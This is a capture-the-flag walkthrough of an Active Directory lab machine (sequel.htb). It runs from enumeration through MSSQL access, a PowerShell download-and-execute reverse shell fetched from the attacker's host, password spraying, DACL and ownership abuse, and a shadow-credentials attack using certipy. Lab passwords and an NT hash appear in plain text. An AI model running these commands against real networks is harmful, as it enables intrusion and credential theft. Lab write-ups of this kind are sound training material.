# Enumeration

## Nmap

```
sudo nmap -sC -sV -vv -oA escapetwo 10.129.232.128
```

```
PORT     STATE SERVICE       REASON          VERSION                                                                                                                                           
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus                                                                                                                                   
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-23 05:28:26Z)                                                                                    
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                                             
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                                     
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)                                                       
|_ssl-date: 2026-06-23T05:29:48+00:00; 0s from scanner time.                                                                                                                                   
| ssl-cert: Subject:                                                                                                                                                                           
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL                                                                                                                    
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel                                                                                                                                     
| Public Key type: rsa                                                                                                                                                                         
| Public Key bits: 2048                                                                                                                                                                        
| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                                 
| Not valid before: 2025-06-26T11:46:45                                                                                                                                                        
| Not valid after:  2124-06-08T17:00:40                                                                                                                                                        
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493                                                                                                                                             
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a                                                                                                                                   
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb 
-----BEGIN CERTIFICATE-----                                                                                                                                                                  
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF                                                                                                                             
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs                                                                                                                             
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0                                                                                                                             
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
| dGKCBlNFUVVFTDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNTQ4NjcwMzk3LTk3MjY4NzQ4NC0zNDk2MzM1MzcwLTEwMDAwDQYJKoZI
| hvcNAQELBQADggEBAILdYpMzCMJ2jrzMqFcZs5zRq1lDJA7Q1W9cZXZpZktTkXdA
| cEkRlcLQN9ZxvydKHdR053nIGNXcVn7CHpK8OU6sleyY0RRm/hktREv53L3tt0i7
| Dks9d14cTKN5+r1aQmeCJo7bRdeeiQcMKDyyKndI4Tn03XWjYS0yOem+2PrrANgs
| 2YWLg6LrslYnHB0xMFup6da7ueNpuRxwekBen20P6v6R3STGascvNVqBNBpNTMRo
| CpokbunsA+8Bqqt3IWX5/Og2wCBL2v/dPiyjSQ3WYOwguyjDF8gQdVMIsW25vUMc
| 3UVUm1yCwc7rr5IEQAkXdTHzbNIHACbCvOotXZM=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-23T05:29:48+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
| dGKCBlNFUVVFTDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNTQ4NjcwMzk3LTk3MjY4NzQ4NC0zNDk2MzM1MzcwLTEwMDAwDQYJKoZI
| hvcNAQELBQADggEBAILdYpMzCMJ2jrzMqFcZs5zRq1lDJA7Q1W9cZXZpZktTkXdA
| cEkRlcLQN9ZxvydKHdR053nIGNXcVn7CHpK8OU6sleyY0RRm/hktREv53L3tt0i7
| Dks9d14cTKN5+r1aQmeCJo7bRdeeiQcMKDyyKndI4Tn03XWjYS0yOem+2PrrANgs
| 2YWLg6LrslYnHB0xMFup6da7ueNpuRxwekBen20P6v6R3STGascvNVqBNBpNTMRo
| CpokbunsA+8Bqqt3IWX5/Og2wCBL2v/dPiyjSQ3WYOwguyjDF8gQdVMIsW25vUMc
| 3UVUm1yCwc7rr5IEQAkXdTHzbNIHACbCvOotXZM=
|_-----END CERTIFICATE-----
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.232.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-06-23T05:29:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-23T05:19:38
| Not valid after:  2056-06-23T05:19:38
| MD5:     d61a f97a 9080 6664 36c4 a5f6 0bb7 96be
| SHA-1:   0b82 0c4a 13a3 06b8 cbfa 705c 5a46 0a65 9487 d079
| SHA-256: f397 7e86 f172 8104 4615 63e1 cfa9 e51a 58f3 33b4 0e74 8566 4206 425a 44df d768
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQPynHTqLFYr5NIXJc+nF4lzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwNjIzMDUxOTM4WhgPMjA1NjA2MjMwNTE5MzhaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1j+Wmk
| WYggZ/4dbuCpLo6fa7ZiqIA/2xBYyMHXZr15IXslpeYlzqiHKT0H0c2Q+QsTwY/X
| mk5d5FSlmMGUA04wwAzWjOYrA2j9vouTP0LRNeO6kEnTob+7ocsMzwtPwz3NjvUK
| 03jXCpmhrrJRegHjg3aVNwTj35Y/KFmtfDwHnbtzXyhuAJtEEisjN2p3c0gCGKaJ
| 5WHBbp9IRs+DS6dYVFUeUcMz4fq5z+s9VvBizR3qCnDSoypL8WV+eOhWIY6h3QiD
| 4MTSsD5Js6q17PvK+GlFfD8el0zSDhNIgkJM29FUW6kJGlfai78l2p4ah+89H/r7
| 1IHiKcY3P1Strk0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAgt62JHcthDddNxbP
| H1iF+um67rXPbYnug6l8UeXqVxE80bzwKaO9BGqCfs7sjDT9IalRHLN1li8OWBHC
| yZ3F7TTI8T6JHX740VSNph0HHtVsLtuMNAHySTZ+pNrpQZU6FH8mJ5ZKPUcLkOc0
| bjpWyc83gM03zSmdvljnWh6wvp44BEhmKEG8hy3SaPhO86ttNx00vMTvnKEeyNAQ
| da/STxTIlez14EOYFpNN90zT77agXoBajVrw+gM5YUyXJKSjbb1ZMenp/KdlbNyN
| BHP+paMJZNWbGRtncQP3wyogCHRPXcd0qMjb98s1f3yas65BwR03O2LNRRJiSomh
| yC08Xg==
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.129.232.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-23T05:29:48+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-23T05:29:48+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
| dGKCBlNFUVVFTDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNTQ4NjcwMzk3LTk3MjY4NzQ4NC0zNDk2MzM1MzcwLTEwMDAwDQYJKoZI
```

There are no interesting ports, only default ones

We start with some credentials. `rose:KxEPkKe6R8su`

## Enumerating shares with NXC with given credentials:
```
nxc smb DC01.sequel.htb -u rose -p KxEPkKe6R8su --shares
```

```
SMB         10.129.232.128  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.128  445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.232.128  445    DC01             [*] Enumerated shares
SMB         10.129.232.128  445    DC01             Share           Permissions     Remark
SMB         10.129.232.128  445    DC01             -----           -----------     ------
SMB         10.129.232.128  445    DC01             Accounting Department READ            
SMB         10.129.232.128  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.128  445    DC01             C$                              Default share
SMB         10.129.232.128  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.128  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.232.128  445    DC01             Users           READ            
```

`Accounting Department` share is readable

## Enumerating users with NXC

```
nxc smb DC01.sequel.htb -u rose -p KxEPkKe6R8su --users
```

```
SMB         10.129.232.128  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.232.128  445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain 
SMB         10.129.232.128  445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain 
SMB         10.129.232.128  445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account 
SMB         10.129.232.128  445    DC01             michael                       2024-06-08 16:47:37 0        
SMB         10.129.232.128  445    DC01             ryan                          2024-06-08 16:55:45 0        
SMB         10.129.232.128  445    DC01             oscar                         2024-06-08 16:56:36 0        
SMB         10.129.232.128  445    DC01             sql_svc                       2024-06-09 07:58:42 0        
SMB         10.129.232.128  445    DC01             rose                          2024-12-25 14:44:54 0        
SMB         10.129.232.128  445    DC01             ca_svc                        2026-06-23 05:32:30 0
```

## Reading the Accounting Department Share with Smbclient

```
smbclient '//10.129.232.128/Accounting Department' -U rose
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> 
```

- There are 2 files, `accounting_2024.xlsx` and `accounts.xlsx`
- These files are not formatted properly and cannot be read
- But these files can be extracted. Excel files are just zip files containing data
- Upon extracting and reading through them, the password for `sa@sequel.htb` which is `MSSQLP@ssw0rd!`

## Using NXC mssql
```
nxc mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```

`NOTE:--local-auth flag is used under the mssql protocol to force the tool to use SQL Server Authentication (local database logins) instead of Windows Authentication (domain logins)`

This authenticates us and we can also execute powershell commands

### Getting Reverse shell

- The `InvokePowerShellTCPOneLine.ps1` script from `Nishang` package can be used to get a reverse shell
- The directory is `/usr/share/nishang/Shells/InvokePowerShellTCPOneLine.ps1`, with the first payload being used
- We will start a Python HTTP server so the machine can download the file
- The command used:
```
nxc mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.42:8000/shell.ps1")'
```

We got a reverse shell as `sequel/sql_svc`

# Foothold

- In `C:\` directory, there is a folder  called `SQL2019`, going into it, we find `sql-Configuration.INI` which contains a password, `WqSZAF6CysDQbGb3`
- This password can be sprayed against all users, and `ryan` will give success
```
nxc smb dc01.sequel.htb -u users.txt -p 'WqSZAF6CysDQbGb3'
```

- Ryan has `winrm` permissions so we can use `Evil-WinRM` to get a shell as him
- The user flag is in Ryan's Desktop folder

# Privilege Escalation
- The `SharpHound` collector can be used in order to get `bloodhound` graph data
```powershell
>.\SharpHound.exe -c All --zipfilename loot.zip
```

![[Pasted image 20260701103722.png]]

- Ryan has `WriteOwner` privileges over `CA_SVC@SEQUEL.HTB`, bloodhound gives us the command required for getting privileges over CA_SVC
![[Pasted image 20260701103857.png]]

## Changing Ownership of CA_SVC
```
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

## Changing DACL of CA_SVC after becoming owner
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

## Using Certipy-ad
`certipy-ad` is a tool which is used for abusing Active Directory Certificate Services (AD CS)

### Creating Shadow Credentials

https://www.hackingarticles.in/shadow-credentials-attack/

```
┌──(kali㉿kali)-[~/htb/escapetwo/bloodhound]
└─$ certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.4.127                                
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '480d1d8ef8b5430c9d4eb1dbcdec56d7'
[*] Adding Key Credential with device ID '480d1d8ef8b5430c9d4eb1dbcdec56d7' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '480d1d8ef8b5430c9d4eb1dbcdec56d7' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

The NT hash is `3b181b914e7a9d5508ea1e20bc2b7fce`

## Certificate Template attack

We use certipy-ad to find which template attack it is vulnerable to

```
┌──(kali㉿kali)-[~/htb/escapetwo]                                                                                                       
└─$ certipy-ad find -dc-ip 10.129.4.127 -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -vuln -stdout                     
Certipy v5.0.4 - by Oliver Lyak (ly4k)                                                                                                  
                                                                                                                                        
[*] Finding certificate templates                                                                                                       
[*] Found 34 certificate templates                                                                                                      
[*] Finding certificate authorities                                                                                                     
[*] Found 1 certificate authority                                                                                                       
[*] Found 12 enabled certificate templates                                                                                              
[*] Finding issuance policies                                                                                                           
[*] Found 15 issuance policies                                                                                                          
[*] Found 0 OIDs linked to templates                                                                                                    
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP                                                                            
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'                                                                        
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'                                                                 
[!] Error checking web enrollment: timed out                                                                                            
[!] Use -debug to print a stacktrace                                                                                                    
[!] Error checking web enrollment: timed out                                                                                            
[!] Use -debug to print a stacktrace                                                                                                    
[*] Enumeration output:                                                                                                                 
Certificate Authorities                                                                                                                 
  0                                                                                                                                     
    CA Name                             : sequel-DC01-CA                                                                                
    DNS Name                            : DC01.sequel.htb                                                                               
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb                                                          
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3                                                              
